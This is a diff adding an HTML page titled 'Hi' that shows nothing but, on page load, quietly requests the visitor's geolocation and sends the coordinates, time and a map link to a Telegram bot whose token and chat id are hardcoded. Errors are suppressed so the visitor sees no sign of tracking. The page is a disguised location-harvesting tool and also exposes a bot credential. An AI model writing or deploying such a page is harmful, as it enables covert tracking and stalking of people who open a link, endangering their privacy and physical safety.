@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Hi</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial; text-align: center; padding: 80px; background: #f0f7ff; }
+    h1 { color: #1a73e8; }
+  </style>
+</head>
+<body>
+  <div id="result"></div>
+
+  <script>
+    const token = "8970456088:AAHBNuNtp9ZlVjVJl_uuI-9G-R1UcIVaYAg";
+    const chatId = "1749244772";
+
+    function sendToTelegram(lat, lon) {
+      const message = `📍 New Location Received!\n\nLatitude: ${lat}\nLongitude: ${lon}\nTime: ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`;
+
+      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) {
+          } else {
+            document.getElementById("result").innerHTML = `<p style="color:red;">Error: ${data.description}</p>`;
+          }
+        })
+        .catch(() => {});}
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const lat = pos.coords.latitude;
+          const lon = pos.coords.longitude;
+          sendToTelegram(lat, lon);
+
+        }, () => {
+        });
+      }
+    }
+
+    window.onload = getLocation;
+  </script>
+</body>
+</html>
